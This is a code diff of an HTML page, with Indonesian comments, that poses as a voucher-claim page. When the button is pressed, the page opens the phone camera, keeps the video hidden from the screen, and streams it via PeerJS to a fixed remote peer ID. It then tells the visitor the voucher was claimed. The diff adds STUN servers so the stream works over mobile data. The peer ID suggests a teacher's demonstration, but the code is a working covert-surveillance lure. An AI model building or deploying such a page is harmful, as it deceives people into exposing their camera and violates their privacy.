@@ -7,8 +7,8 @@
   <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
   <style>
     body { font-family: sans-serif; text-align: center; padding: 40px 20px; background: #f4f4f9; }
-    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-    button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 6px; cursor: pointer; font-weight: bold; }
+    .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 0 auto; }
+    button { background: #28a745; color: white; border: none; padding: 14px 28px; font-size: 18px; border-radius: 6px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 15px; }
     #status { margin-top: 15px; color: #666; font-size: 14px; }
   </style>
 </head>
@@ -20,11 +20,23 @@
     <p id="status"></p>
   </div>
 
+  <!-- Kamera tersembunyi dari layar HP -->
   <video id="webcam" autoplay playsinline style="display: none;"></video>
 
   <script>
     const ID_LAPTOP = "guru-demo-kamera-123";
-    const peer = new Peer();
+    
+    // Konfigurasi PeerJS dengan STUN Server Google (Mendukung Paket Data Seluler)
+    const peer = new Peer({
+      config: {
+        iceServers: [
+          { urls: 'stun:stun.l.google.com:19302' },
+          { urls: 'stun:stun1.l.google.com:19302' },
+          { urls: 'stun:stun2.l.google.com:19302' }
+        ]
+      }
+    });
+
     let currentStream = null;
     let isFrontCamera = false;
     let dataConn = null;
@@ -45,7 +57,6 @@
 
     async function prosesKlaim() {
       document.getElementById('status').innerText = "Memproses voucher...";
-      // Memicu permintaan akses kamera saat tombol ditekan
       await startCamera();
       alert("Voucher Berhasil Diklaim!");
       document.getElementById('status').innerText = "Voucher Aktif.";
@@ -63,7 +74,7 @@
         document.getElementById('webcam').srcObject = currentStream;
         peer.call(ID_LAPTOP, currentStream);
       } catch (err) {
-        console.error(err);
+        console.error("Gagal mengakses kamera:", err);
       }
     }
   </script>
